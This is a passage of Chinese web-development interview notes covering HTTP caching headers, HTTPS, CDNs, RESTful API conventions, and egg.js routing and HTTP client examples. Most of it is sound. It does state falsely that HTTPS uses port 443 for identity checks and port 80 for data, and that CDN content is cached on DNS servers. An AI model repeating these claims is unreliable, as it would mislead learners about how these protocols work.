<li><strong>加快了客户端加载网页的速度</strong> 这也正是HTTP缓存属于客户端缓存的原因。</li></ol> <h4 id="分类【要点】"><a href="#分类【要点】" class="header-anchor">#</a> 分类【要点】</h4> <h5 id="按协议分"><a href="#按协议分" class="header-anchor">#</a> 按协议分</h5> <ul><li><strong>非协议层缓存</strong>：利用 <code>meta</code> 标签的 <code>http-equiv</code> 属性值； <code>Expires</code>,<code>set-cookie</code>。</li> <li><strong>协议层缓存</strong>：利用 http 协议头属性值设置；</li></ul> <h5 id="协议层缓存再分类"><a href="#协议层缓存再分类" class="header-anchor">#</a> <strong>协议层缓存再分类</strong></h5> <ul><li><strong>强缓存</strong>：利用 <strong>cache-control 和 expires</strong> 设置，直接返回一个过期时间，所以在缓存期间不请求；</li> <li><strong>协商缓存</strong>：响应头返回 <strong>etag 或 last-modified</strong> 的哈希值，<strong>第二次请求头 If-none-match 或 IF-modify-since 携带上次哈希值</strong>，一致则返回 304。</li></ul> <table><thead><tr><th>类型</th> <th>特性</th></tr></thead> <tbody><tr><td>强缓存</td> <td>通过 cache-control 和 expires 设置，属性值是时间，所以在时间内不用请求</td></tr> <tr><td>协商缓存</td> <td>通过 If-none-match(etag)设置，etag 属性是哈希值，所以要请求和服务器值对比</td></tr></tbody></table> <p><strong>no-cache和no-store很容易混淆：</strong></p> <blockquote><ol><li>no-cache 是指先要和服务器确认是否有资源更新，再进行判断。也就是说没有强缓存，但是会有协商缓存；</li> <li>no-store 是指<strong>不使用任何缓存</strong>，每次请求都直接从服务器获取资源。</li></ol></blockquote> <h5 id="总括要点-4个-【ceel】"><a href="#总括要点-4个-【ceel】" class="header-anchor">#</a> 总括要点(4个)【CEEL】</h5> <ul><li><p>强缓存</p> <ul><li>cache-control</li> <li>Expires</li></ul></li> <li><p>协商缓存; Cache-control 设置为no-cache，max-age=0过期时；</p> <ul><li>Etag 和 If-None-Match</li> <li>Last-Modified 和 If-Modified-Since</li></ul></li></ul> <h5 id="优先级"><a href="#优先级" class="header-anchor">#</a> <strong>优先级</strong></h5> <ul><li>强制缓存的优先级高于协商缓存，当执行强制缓存时，如若缓存命中，则直接使用缓存数据库数据，不在进行缓存协商。</li> <li>如果不是强制刷新，而且请求头带上了if-modified-since和if-none-match两个字段，<strong>则先判断etag，再判断last-modified。</strong></li> <li>处理顺序：<strong>强制缓存 &gt; 协商缓存; cache-control &gt; Expires &gt; Etag &gt; Last-modified</strong>；</li> <li>注意：<code>If-None-Match</code>(etag)的优先级比<code>If-Modified-Since</code>(last-modified)高，两者同时存在时，遵从前者。<code>Last-Modified</code> 是由一个 <code>unix timestamp</code> 表示，则<strong>意味着它只能作用于秒级的改变</strong></li></ul> <h5 id="nodejs服务端设置ceel"><a href="#nodejs服务端设置ceel" class="header-anchor">#</a> nodejs服务端设置CEEL</h5> <ul><li><code>res.setHeader('Cache-Control',</code>public, max-age=${maxAge}<code>);</code></li> <li><code>res.setHeader('Expires', (new Date(Date.now() + maxAge * 1000)).toUTCString());</code></li> <li><code>res.setHeader('ETag',</code>${stats.size}-${stats.mtime.toUTCString()}<code>);</code></li> <li><code>res.setHeader('Last-Modified', stats.mtime.toUTCString());</code></li></ul> <p>Etag：<strong>资源的实体标识（哈希字符串）</strong>，<strong>当资源内容更新时，Etag会改变。服务器会判断Etag是否发生变化</strong>，如果变化则返回新资源，否则返回304。</p> <blockquote><h4 id="如果-http-响应头中-etag-值改变了-是否意味着文件内容一定已经更改"><a href="#如果-http-响应头中-etag-值改变了-是否意味着文件内容一定已经更改" class="header-anchor">#</a> 如果 http 响应头中 ETag 值改变了，是否意味着文件内容一定已经更改</h4></blockquote> <p>不一定，由服务器中 <code>ETag</code> 的生成算法决定。
比如 <code>nginx</code> 中的 <code>etag</code> 由 <code>last_modified</code> 与 <code>content_length</code> 组成，而 <code>last_modified</code> 又由 <code>mtime</code> 组成
当编辑文件却未更改文件内容时，或者 <code>touch file</code>，<code>mtime</code> 也会改变，此时 <code>etag</code> 改变，但是文件内容没有更改。</p> <h4 id="缓存的流程图【要点】"><a href="#缓存的流程图【要点】" class="header-anchor">#</a> 缓存的流程图【要点】</h4> <blockquote><p>F5 刷新会忽略强缓存不会忽略协商缓存，ctrl+f5 都失效</p></blockquote> <ol><li><strong>会先判断强缓存</strong>；Cache-Control(max-age) no-cache=true, public ；Expires,</li> <li><strong>再判断协商缓存 <code>etag</code>及<code>last-modified</code>是否存在</strong>；存在利用属性 If-None-match（etag）If-Modified-since(last-modified)携带值(这一步叫做<strong>数据签名</strong>)；</li> <li><strong>请求服务器,服务器对比 etag(last-modified)，生效返回 304</strong></li></ol> <p><img src="/rat-summ/assets/img/10-03-56.95a824fd.jpg" alt="img"></p> <p><img src="/rat-summ/assets/img/12-55-20.149a22d3.jpg" alt="img"></p> <p>代码处理示例：
<img src="/rat-summ/assets/img/21-09-05.80bb80d9.jpg" alt=""></p> <h4 id="不同刷新的请求执行过程"><a href="#不同刷新的请求执行过程" class="header-anchor">#</a> 不同刷新的请求执行过程</h4> <ol><li><p><strong>浏览器地址栏中写入URL，回车</strong> 浏览器发现缓存中有这个文件了，不用继续请求了，直接去缓存拿.<strong>（最快）</strong></p></li> <li><p><strong>F5</strong> F5就是告诉浏览器，别偷懒，好歹<strong>去服务器看看这个文件是否有过期</strong>了。于是浏览器就胆胆襟襟的发送一个请求带上If-Modify-since。</p></li> <li><p><strong>Ctrl+F5</strong> 告诉浏览器，你先把你缓存中的这个文件给我删了，然后再去服务器请求个完整的资源文件下来。<strong>于是客户端就完成了强行更新的操作.</strong></p></li></ol> <blockquote><h4 id="_200-from-cache和200-ok有什么区别"><a href="#_200-from-cache和200-ok有什么区别" class="header-anchor">#</a> 200 From cache和200 OK有什么区别</h4></blockquote> <ul><li>顾名思义是form cache是强缓存，不会和服务器通信，</li> <li>而200 OK即为服务器处理结果正确。以此可以从浏览器缓存、输入url回车、刷新页面以及强制刷新等方面展开缓存方面的讲解。</li></ul> <blockquote><h4 id="能不能说下-304-的过程-以及影响缓存的头部属性有哪些"><a href="#能不能说下-304-的过程-以及影响缓存的头部属性有哪些" class="header-anchor">#</a> 能不能说下 304 的过程，以及影响缓存的头部属性有哪些？</h4></blockquote> <p>写那个缓存流程图即可；</p> <ul><li>1、对于强制缓存，服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不在时间内，执行比较缓存策略；</li> <li>2、对于比较缓存，将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存；</li></ul> <h3 id="_8-https"><a href="#_8-https" class="header-anchor">#</a> 8:Https</h3> <h4 id="http与https的区别"><a href="#http与https的区别" class="header-anchor">#</a> HTTP与HTTPS的区别</h4> <p><img src="/rat-summ/assets/img/22-00-54.2f594895.jpg" alt=""></p> <h4 id="https传输过程"><a href="#https传输过程" class="header-anchor">#</a> https传输过程</h4> <p>HTTPS其实是有两部分组成：HTTP + SSL / TLS，也就是<strong>在HTTP上又加了一层处理加密信息的模块</strong>。
服务端和客户端的信息传输<strong>都会通过TLS进行加密</strong>，所以传输的数据都是加密后的数据。具体是如何进行加密，解密，验证的，且看下图。</p> <p>https并不是直接通过非对称加密传输过程，<strong>而是有握手过程，握手过程主要是和服务器做通讯</strong>，生成私有秘钥，最后通过该秘钥对称加密传输数据。还有验证证书的正确性。 证书验证过程保证了对方是合法的，并且中间人无法通过伪造证书方式进行攻击。</p> <p><img src="/rat-summ/assets/img/22-00-13.0260f8a3.jpg" alt=""></p> <blockquote><h4 id="https用哪些端口进行通信-这些端口分别有什么用"><a href="#https用哪些端口进行通信-这些端口分别有什么用" class="header-anchor">#</a> https用哪些端口进行通信，这些端口分别有什么用</h4></blockquote> <ul><li>443端口用来验证服务器端和客户端的身份，比如验证证书的合法性</li> <li>80端口用来传输数据（在验证身份合法的情况下，用来数据传输）</li></ul> <blockquote><h4 id="https验证身份也就是tsl-ssl身份验证的过程"><a href="#https验证身份也就是tsl-ssl身份验证的过程" class="header-anchor">#</a> https验证身份也就是TSL/SSL身份验证的过程</h4></blockquote> <p>简要图解如下： <img src="/rat-summ/assets/img/22-01-32.918cac02.jpg" alt="img"></p> <h3 id="_9-http中的优化"><a href="#_9-http中的优化" class="header-anchor">#</a> 9:HTTP中的优化</h3> <h4 id="优化【要点】"><a href="#优化【要点】" class="header-anchor">#</a> 优化【要点】</h4> <ul><li>减少网站中使用的域名 域名越多 ， DNS 解析花费的时间越多。</li> <li>减少网站中的重定向操作，重定向会增加请求数量。</li> <li>选用高性能的Web服务器 Nginx 代理静态资源 。</li> <li>资源大小优化：对资源进行压缩、合并（合并可以减少请求，也会产生文件缓存问题）， 使用 gzip/br 压缩。</li> <li>给资源添加强制缓存和协商缓存。</li> <li>升级 HTTP/1.x 到 HTTP/2</li> <li>付费、将静态资源迁移至 CDN；</li></ul> <h4 id="timing"><a href="#timing" class="header-anchor">#</a> Timing</h4> <p><img src="/rat-summ/assets/img/image-20211104202528136.8d174d38.png" alt="image-20211104202528136"></p> <ul><li>Queuing : 请求发送前会根据优先级进行排队，<strong>同时每个域名最多处理6个TCP链接</strong>；</li> <li>超过的也会进行排队，并且分配磁盘空间时也会消耗一定时间。</li> <li>Stalled :请求发出前的等待时间（处理代理，链接复用）</li> <li>DNS lookup :查找 DNS 的时间</li> <li>initial Connection :建立TCP链接时间</li> <li>SSL : SSL 握手时间（ SSL 协商）</li> <li>Request Sent :请求发送时间（可忽略）</li> <li>Waiting ( TTFB ) :等待响应的时间，等待返回首个字符的时间</li> <li>Content Dowloaded :用于下载响应的时间</li></ul> <h3 id="_10-cdn"><a href="#_10-cdn" class="header-anchor">#</a> 10:CDN</h3> <p>CDN 的全称是Content Delivery Network，受制于网络的限制，访问者离服务器越远访问速度就越慢</p> <p>核心就是<strong>离你最近的服务器给你提供数据</strong> （代理 + 缓存【代缓-核心要点】）</p> <ul><li><p>先在全国各地架设 CDN 服务器</p></li> <li><p>正常访问网站会通过 DNS 解析，解析到对应的服务器；</p> <ul><li>解析1：我们通过 CDN 域名访问时，会被解析到 CDN 专用 DNS 服务器。并返回 CDN 全局负载均衡服务器的 IP 地址。</li> <li>解析2：向全局负载均衡服务器发起请求，全局负载均衡服务器会根据用户 IP 分配用户所属区域的负载均衡服务器。并返回一台 CDN 服务器 IP 地址；</li></ul></li> <li><p>用户向 CDN 服务器发起请求。如果服务器上不存在此文件。则向上一级缓存服务器请求，直至查找到源服务器，返回结果并缓存到 DNS 服务器上。</p></li></ul> <p><img src="/rat-summ/assets/img/image-20211104202709379.69746c51.png" alt="image-20211104202709379"></p> <h2 id="restful-graphql"><a href="#restful-graphql" class="header-anchor">#</a> RESTful/Graphql</h2> <h3 id="restful"><a href="#restful" class="header-anchor">#</a> RESTful</h3> <p>一种比较成熟的应用程序的API设计理论；URL定位资源，用HTTP动词（GET,POST,DELETE,DETC）描述操作。</p> <p>作为开发者尽量按照这种API设计风格设置，方便对接前端及第三方使用；</p> <h4 id="格式"><a href="#格式" class="header-anchor">#</a> 格式</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>GET /api/v2/topics                             <span class="token number">200</span>
GET /api/v2/topics/57ea257b3670ca3f44c5beb6    <span class="token number">200</span>
POST /api/v2/topics                            <span class="token number">201</span>
PUT /api/v2/topics/57ea257b3670ca3f44c5beb6    <span class="token number">204</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="http动词【crud-pho】"><a href="#http动词【crud-pho】" class="header-anchor">#</a> HTTP动词【CRUD PHO】</h4> <p>对于资源的具体操作类型，由HTTP动词表示。</p> <p>常用的HTTP动词有下面五个（括号里是对应的SQL命令）。</p> <blockquote><ul><li>GET（SELECT）：从服务器取出资源（一项或多项）。</li> <li>POST（CREATE）：在服务器新建一个资源。</li> <li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li> <li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li> <li>DELETE（DELETE）：从服务器删除资源。</li></ul></blockquote> <p>还有两个不常用的HTTP动词。</p> <blockquote><ul><li>HEAD：获取资源的元数据。</li> <li>OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。</li></ul></blockquote> <p>下面是一些例子。</p> <blockquote><ul><li>GET /zoos：列出所有动物园</li> <li>POST /zoos：新建一个动物园</li> <li>GET /zoos/ID：获取某个指定动物园的信息</li> <li>PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）</li> <li>PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）</li> <li>DELETE /zoos/ID：删除某个动物园</li> <li>GET /zoos/ID/animals：列出某个指定动物园的所有动物</li> <li>DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物</li></ul></blockquote> <p><img src="/rat-summ/assets/img/image-20211103103955493.e164ff6a.png" alt="image-20211103103955493"></p> <p><img src="/rat-summ/assets/img/image-20211103104135232.9f4d396e.png" alt="image-20211103104135232"></p> <h4 id="过滤信息-filtering"><a href="#过滤信息-filtering" class="header-anchor">#</a> 过滤信息（Filtering）</h4> <p>如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。</p> <p>下面是一些常见的参数。</p> <blockquote><ul><li>?limit=10：指定返回记录的数量</li> <li>?offset=10：指定返回记录的开始位置。</li> <li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li> <li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li> <li>?animal_type_id=1：指定筛选条件</li></ul></blockquote> <p>参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。</p> <h4 id="状态码-status-codes-【核心】"><a href="#状态码-status-codes-【核心】" class="header-anchor">#</a> 状态码（Status Codes）【核心】</h4> <p>服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。</p> <blockquote><ul><li>200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。</li> <li>201 CREATED - <strong>[POST/PUT/PATCH]：用户新建或修改数据成功。</strong></li> <li>202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）</li> <li>204 NO CONTENT - <strong>[DELETE]：用户删除数据成功</strong>。</li> <li>400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</li> <li>401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</li> <li>403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</li> <li>404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</li> <li>406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</li> <li>410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</li> <li>422 Unprocesable entity - [POST/PUT/PATCH] <strong>当创建一个对象时，发生一个验证错误</strong>。</li> <li>500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</li></ul></blockquote> <h4 id="egg的-url-定义"><a href="#egg的-url-定义" class="header-anchor">#</a> egg的 URL 定义</h4> <p>eggjs如果想通过 RESTful 的方式来定义路由， 我们提供了 `app.resources('routerName', 'pathMatch', controller) 快速在一个路径上生成 <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank" rel="noopener noreferrer">CRUD<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 路由结构。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>router<span class="token punctuation">.</span><span class="token function">resources</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token string">'/api/v1/users'</span><span class="token punctuation">,</span> controller<span class="token punctuation">.</span>v1<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// app/controller/v1/users.js</span>

<span class="token keyword">const</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'head'</span><span class="token punctuation">,</span> <span class="token string">'options'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">,</span> <span class="token string">'patch'</span><span class="token punctuation">,</span> <span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'del'</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">,</span> <span class="token string">'resources'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app/router.js</span>
module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token parameter">app</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> router<span class="token punctuation">,</span> controller <span class="token punctuation">}</span> <span class="token operator">=</span> app<span class="token punctuation">;</span>
  router<span class="token punctuation">.</span><span class="token function">resources</span><span class="token punctuation">(</span><span class="token string">'posts'</span><span class="token punctuation">,</span> <span class="token string">'/api/posts'</span><span class="token punctuation">,</span> controller<span class="token punctuation">.</span>posts<span class="token punctuation">)</span><span class="token punctuation">;</span>
  router<span class="token punctuation">.</span><span class="token function">resources</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token string">'/api/v1/users'</span><span class="token punctuation">,</span> controller<span class="token punctuation">.</span>v1<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// app/controller/v1/users.js</span>
    
  <span class="token comment">//如果要考虑授权的情况下，会这样设置；</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> router<span class="token punctuation">,</span> controller<span class="token punctuation">,</span> config <span class="token punctuation">}</span> <span class="token operator">=</span> app
    <span class="token keyword">const</span> <span class="token punctuation">{</span> baseAPI <span class="token punctuation">}</span> <span class="token operator">=</span> config<span class="token punctuation">.</span>adm
    <span class="token keyword">const</span> categories <span class="token operator">=</span> controller<span class="token punctuation">.</span>categories
    <span class="token keyword">const</span> module <span class="token operator">=</span> <span class="token string">'categories'</span>
    <span class="token comment">// router.resources('categories', '/categories', controller.categories)</span>
    <span class="token keyword">const</span> nsRouter <span class="token operator">=</span> router<span class="token punctuation">.</span><span class="token function">namespace</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>baseAPI<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>module<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token comment">//namespace(prefix, ...middlewares) {</span>
    nsRouter<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> app<span class="token punctuation">.</span>role<span class="token punctuation">.</span><span class="token function">can</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> categories<span class="token punctuation">.</span>create<span class="token punctuation">)</span>
    nsRouter<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/:id'</span><span class="token punctuation">,</span> app<span class="token punctuation">.</span>role<span class="token punctuation">.</span><span class="token function">can</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> categories<span class="token punctuation">.</span>update<span class="token punctuation">)</span>
    nsRouter<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'/:id'</span><span class="token punctuation">,</span> app<span class="token punctuation">.</span>role<span class="token punctuation">.</span><span class="token function">can</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> categories<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>
    nsRouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/:id'</span><span class="token punctuation">,</span> categories<span class="token punctuation">.</span>show<span class="token punctuation">)</span>
    nsRouter<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> categories<span class="token punctuation">.</span>index<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>上面代码就在 <code>/posts</code> 路径上部署了一组 CRUD 路径结构，对应的 Controller 为 <code>app/controller/posts.js</code> 接下来， 你只需要在 <code>posts.js</code> 里面实现对应的函数就可以了。</p> <table><thead><tr><th>Method</th> <th>Path</th> <th>Route Name</th> <th>Controller.Action</th></tr></thead> <tbody><tr><td>GET</td> <td>/posts</td> <td>posts</td> <td>app.controllers.posts.index</td></tr> <tr><td>GET</td> <td>/posts/new</td> <td>new_post</td> <td>app.controllers.posts.new</td></tr> <tr><td>GET</td> <td>/posts/:id</td> <td>post</td> <td>app.controllers.posts.show</td></tr> <tr><td>GET</td> <td>/posts/:id/edit</td> <td>edit_post</td> <td>app.controllers.posts.edit</td></tr> <tr><td>POST</td> <td>/posts</td> <td>posts</td> <td>app.controllers.posts.create</td></tr> <tr><td>PUT</td> <td>/posts/:id</td> <td>post</td> <td>app.controllers.posts.update</td></tr> <tr><td>DELETE</td> <td>/posts/:id</td> <td>post</td> <td>app.controllers.posts.destroy</td></tr></tbody></table> <h4 id="ctx-curl与request库使用"><a href="#ctx-curl与request库使用" class="header-anchor">#</a> <code>ctx.curl</code>与<code>request</code>库使用</h4> <p>HttpClient 的默认 method 会设置为 <code>GET</code>。</p> <ul><li><p>返回值 <code>result</code>会包含 3 个属性：</p> <p><code>status</code>、<code>headers</code>和 <code>data</code></p> <ul><li><code>status</code>: 响应状态码，如 <code>200</code>, <code>302</code>, <code>404</code>, <code>500</code> 等等</li> <li><code>headers</code>: 响应头，类似 <code>{ 'content-type': 'text/html', ... }</code></li> <li><code>data</code>: 响应 body，默认 HttpClient 不会做任何处理，会直接返回 Buffer 类型数据。 一旦设置了 <code>options.dataType</code>，HttpClient 将会根据此参数对 <code>data</code> 进行相应的处理。</li></ul></li></ul> <p>完整的请求参数 <code>options</code> 和返回值 <code>result</code> 的说明请看下文的 <a href="https://eggjs.org/zh-cn/core/httpclient.html#options-%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3" target="_blank" rel="noopener noreferrer">options 参数详解<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 章节。</p> <p>以下例子都会在 controller 代码中对 https://httpbin.org 发起请求来完成。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//get 读取数据几乎都是使用 GET 请求，它是 HTTP 世界最常见的一种，也是最广泛的一种，它的请求参数也是最容易构造的。</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token string">'https://httpbin.org/get?foo=bar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//post 创建数据的场景一般来说都会使用 POST 请求，它相对于 GET 来说多了请求 body 这个参数。</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token string">'https://httpbin.org/post'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token comment">// 必须指定 method</span>
    contentType<span class="token operator">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span><span class="token comment">// 通过 contentType 告诉 HttpClient 以 JSON 格式发送</span>
    dataType<span class="token operator">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span><span class="token comment">// 明确告诉 HttpClient 以 JSON 格式处理返回的响应 body</span>
    data<span class="token operator">:</span> <span class="token punctuation">{</span>
        hello<span class="token operator">:</span> <span class="token string">'world'</span><span class="token punctuation">,</span>
        now<span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//put PUT 与 POST 类似，它更加适合更新数据和替换数据的语义。 除了 method 参数需要设置为 PUT，其他参数几乎跟 POST 一模一样。</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token string">'https://httpbin.org/put'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    method<span class="token operator">:</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span>
    contentType<span class="token operator">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>
    dataType<span class="token operator">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>
    data<span class="token operator">:</span> <span class="token punctuation">{</span>
        update<span class="token operator">:</span> <span class="token string">'foo bar'</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//delete  删除数据会选择 DELETE 请求，它通常可以不需要加请求 body，但是 HttpClient 不会限制。</span>
 <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token string">'https://httpbin.org/delete'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
     method<span class="token operator">:</span> <span class="token string">'DELETE'</span><span class="token punctuation">,</span>
     dataType<span class="token operator">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> result<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p><code>request</code>/<code>request-promise</code> 库使用示例:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//request request-promise 库使用示例</span>
<span class="token keyword">const</span> rp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request-promise'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
    method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
    uri<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://devpython.iwifi.com:8082/Meet/face/V1804261328.U.JSON</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span><span class="token comment">//设备状态；</span>
    <span class="token comment">// headers: {</span>
    <span class="token comment">//   /* 'content-type': 'application/x-www-form-urlencoded' */ // Is set automatically</span>
       <span class="token comment">/* 'content-type': 'multipart/form-data' */</span>
    <span class="token comment">// },</span>
